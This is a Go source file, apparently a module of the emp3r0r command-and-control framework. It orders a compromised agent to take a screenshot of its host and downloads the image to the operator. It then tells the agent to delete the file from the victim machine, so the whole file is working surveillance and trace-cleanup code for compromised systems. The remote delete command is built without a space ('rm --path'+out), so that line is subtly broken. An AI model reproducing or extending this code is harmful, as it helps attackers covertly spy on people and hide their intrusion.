package modules

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// TakeScreenshot take a screenshot of selected target, and download it
// open the picture if possible
func TakeScreenshot(cmd *cobra.Command, args []string) {
	// tell agent to take screenshot
	screenshotErr := agents.SendCmdToCurrentAgent(def.C2CmdScreenshot, "")
	if screenshotErr != nil {
		logging.Errorf("send screenshot cmd: %v", screenshotErr)
		return
	}

	// then we handle the cmd output in agentHandler
}

// ProcessScreenshot download and process screenshot
func ProcessScreenshot(out string, target *def.Emp3r0rAgent) (err error) {
	if strings.Contains(out, "Error") {
		return fmt.Errorf("%s", out)
	}
	logging.Infof("We will get %s screenshot file for you, wait", strconv.Quote(out))
	_, err = ftp.GetFile(out, target)
	if err != nil {
		err = fmt.Errorf("get screenshot: %v", err)
		return
	}

	// basename
	path := util.FileBaseName(out)

	// be sure we have downloaded the file
	is_download_completed := func() bool {
		return !util.IsExist(live.FileGetDir+path+".downloading") &&
			util.IsExist(live.FileGetDir+path)
	}

	is_download_corrupted := func() bool {
		return !is_download_completed() && !util.IsExist(live.FileGetDir+path+".lock")
	}
	for {
		time.Sleep(100 * time.Millisecond)
		if is_download_completed() {
			break
		}
		if is_download_corrupted() {
			logging.Warningf("Processing screenshot %s: incomplete download detected, retrying...",
				strconv.Quote(out))
			return ProcessScreenshot(out, target)
		}
	}

	// unzip if it's zip
	if strings.HasSuffix(path, ".zip") {
		err = util.Unarchive(live.FileGetDir+path, live.FileGetDir)
		if err != nil {
			return fmt.Errorf("unarchive screenshot zip: %v", err)
		}
		logging.Warningf("Multiple screenshots extracted to %s", live.FileGetDir)
		return
	}

	// open it if possible
	if util.IsCommandExist("xdg-open") &&
		os.Getenv("DISPLAY") != "" {
		logging.Infof("Seems like we can open the picture (%s) for you to view, hold on",
			live.FileGetDir+path)
		cmd := exec.Command("xdg-open", live.FileGetDir+path)
		err = cmd.Start()
		if err != nil {
			return fmt.Errorf("crap, we cannot open the picture: %v", err)
		}
	}

	// tell agent to delete the remote file
	err = agents.SendCmd("rm --path"+out, "", target)
	if err != nil {
		logging.Warningf("Failed to delete remote file %s: %v", strconv.Quote(out), err)
	}

	return
}
